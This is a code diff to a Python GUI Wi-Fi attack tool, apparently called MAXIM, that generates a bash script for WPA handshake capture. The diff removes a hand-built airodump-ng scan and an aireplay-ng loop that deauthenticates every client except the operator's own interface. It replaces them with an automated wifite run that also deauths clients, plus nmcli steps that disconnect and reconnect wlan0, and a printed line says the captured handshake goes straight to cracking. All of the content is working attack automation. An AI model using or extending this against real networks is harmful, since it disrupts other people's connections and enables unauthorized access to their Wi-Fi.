@@ -1113,74 +1113,24 @@ class MaximWindow(QMainWindow):
         script.write(f"sudo iw dev {iface} set type monitor 2>/dev/null\n")
         script.write(f"sudo ip link set {iface} up 2>/dev/null\n\n")
 
-        # Get wlan0 MAC so we can exclude it from deauth
-        script.write("MY_MAC=$(cat /sys/class/net/wlan0/address 2>/dev/null)\n")
-        script.write("echo \"wlan0 MAC: $MY_MAC (will not be deauthed)\"\n\n")
+        # Disconnect wlan0 from the target network BEFORE deauthing
+        # so wifite's deauth doesn't kill our connection mid-capture.
+        # We reconnect wlan0 after capture is done.
+        script.write("# Save current wlan0 connection to restore later\n")
+        script.write("WLAN0_CON=$(nmcli -t -f NAME,DEVICE con show --active 2>/dev/null | grep 'wlan0' | cut -d: -f1)\n")
+        script.write("if [ -n \"$WLAN0_CON\" ]; then\n")
+        script.write("  echo \"Disconnecting wlan0 from $WLAN0_CON (will reconnect after capture)\"\n")
+        script.write("  nmcli dev disconnect wlan0 2>/dev/null\n")
+        script.write("fi\n\n")
 
-        # Manual approach: airodump scan → find target → capture + selective deauth
-        # This way we only deauth clients that are NOT our wlan0
-        scan_csv = "/tmp/maxim_hscan"
-        script.write(f"rm -f {scan_csv}-* 2>/dev/null\n\n")
+        # wifite: scan + capture + deauth, all automatic
+        script.write(f"sudo wifite -i {iface} --essid '{essid}' --wpa --no-pmkid --num-deauths 10\n\n")
 
-        # Quick scan to find BSSID + channel (30s airodump with CSV, background)
-        script.write(f"echo '[1/3] Finding {essid}...'\n")
-        script.write(f"sudo timeout 30 airodump-ng -w '{scan_csv}' --output-format csv --write-interval 1 {iface} >/dev/null 2>&1\n")
-        script.write("BSSID=''\nCHANNEL=''\n")
-        # Parse CSV — find line containing our ESSID with a MAC at the start
-        script.write(f"CSV=$(ls -t {scan_csv}-*.csv 2>/dev/null | head -1)\n")
-        script.write("if [ -n \"$CSV\" ]; then\n")
-        script.write(f"  LINE=$(grep -i '{essid}' \"$CSV\" | grep -E '^[0-9A-Fa-f]{{2}}:' | head -1)\n")
-        script.write("  if [ -n \"$LINE\" ]; then\n")
-        script.write("    BSSID=$(echo \"$LINE\" | cut -d, -f1 | tr -d ' ')\n")
-        script.write("    CHANNEL=$(echo \"$LINE\" | cut -d, -f4 | tr -d ' ')\n")
-        # Validate channel
-        script.write("    if ! echo \"$CHANNEL\" | grep -qE '^[0-9]+$' || [ \"$CHANNEL\" -lt 1 ] || [ \"$CHANNEL\" -gt 165 ]; then\n")
-        script.write("      echo \"Bad channel: $CHANNEL, trying other fields...\"\n")
-        script.write("      for F in 3 5 6; do\n")
-        script.write("        CH=$(echo \"$LINE\" | cut -d, -f$F | tr -d ' ')\n")
-        script.write("        if echo \"$CH\" | grep -qE '^[0-9]+$' && [ \"$CH\" -ge 1 ] && [ \"$CH\" -le 165 ]; then\n")
-        script.write("          CHANNEL=$CH; break\n")
-        script.write("        fi\n")
-        script.write("      done\n")
-        script.write("    fi\n")
-        script.write("  fi\n")
-        script.write("fi\n")
-        script.write(f"rm -f {scan_csv}-* 2>/dev/null\n\n")
-
-        script.write("if [ -z \"$BSSID\" ] || [ -z \"$CHANNEL\" ]; then\n")
-        script.write(f"  echo '[!] Could not find {essid}'\n")
-        script.write(f"  echo 'FAILED' > '{signal_file}'\n")
-        script.write("  read -p 'Press Enter to close'\n  exit 1\nfi\n\n")
-
-        script.write("echo \"Found: BSSID=$BSSID  Channel=$CHANNEL\"\n\n")
-
-        # [2/3] Selective deauth in background — deauth clients that are NOT our wlan0 MAC
-        script.write("echo '[2/3] Deauthing other clients (not wlan0)...'\n")
-        script.write("(\n")
-        script.write("  sleep 5\n")
-        script.write("  for round in $(seq 1 20); do\n")
-        # Get connected stations from a quick airodump
-        script.write(f"    sudo timeout 5 airodump-ng -c $CHANNEL --bssid $BSSID -w /tmp/maxim_sta --output-format csv {iface} >/dev/null 2>&1\n")
-        script.write("    STA_CSV=$(ls -t /tmp/maxim_sta-*.csv 2>/dev/null | head -1)\n")
-        script.write("    if [ -n \"$STA_CSV\" ]; then\n")
-        # Station section: lines after 'Station MAC' header, containing our BSSID
-        script.write("      grep -i \"$BSSID\" \"$STA_CSV\" | grep -E '^[0-9A-Fa-f]{2}:' | while read -r SLINE; do\n")
-        script.write("        STA=$(echo \"$SLINE\" | cut -d, -f1 | tr -d ' ')\n")
-        # Skip our own MAC
-        script.write("        if [ -n \"$MY_MAC\" ] && echo \"$STA\" | grep -qi \"$MY_MAC\"; then continue; fi\n")
-        script.write("        echo \"  Deauth: $STA\"\n")
-        script.write("        sudo aireplay-ng --deauth 5 -a $BSSID -c $STA {iface} >/dev/null 2>&1\n")
-        script.write("      done\n")
-        script.write("    fi\n")
-        script.write("    rm -f /tmp/maxim_sta-* 2>/dev/null\n")
-        script.write("    sleep 5\n")
-        script.write("  done\n")
-        script.write(") &\n\n")
-
-        # [3/3] Capture in foreground
-        script.write("echo '[3/3] Capturing handshake...'\n")
-        script.write("echo \"MAXIM will auto-detect handshake and start cracking.\"\necho\n")
-        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' {iface}\n\n")
+        # Reconnect wlan0 after wifite is done
+        script.write("if [ -n \"$WLAN0_CON\" ]; then\n")
+        script.write("  echo 'Reconnecting wlan0...'\n")
+        script.write("  nmcli con up \"$WLAN0_CON\" 2>/dev/null\n")
+        script.write("fi\n\n")
 
         # If wifite exits, write signal so poller knows
         script.write(f"echo 'DONE' > '{signal_file}'\n")
